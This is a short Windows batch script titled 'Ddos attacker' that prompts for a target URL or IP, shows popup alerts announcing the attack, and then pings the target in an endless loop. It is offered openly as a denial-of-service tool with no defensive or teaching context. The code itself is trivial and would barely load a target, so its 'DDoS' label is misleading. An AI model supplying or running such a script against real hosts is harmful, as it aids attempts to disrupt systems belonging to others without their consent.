@echo off
color 2
title Ddos attacker
echo USE AT OWN RISK!
set /p target=Enter taget's URL/IP-Adress: 
mshta "javascript:alert('Attacking %target%...');close();"
mshta "javascript:alert('Press CRTL + C to stop the attack!');close();"

:loop
echo.
echo pinging %target%
echo.
ping -n 1 %target%
goto loop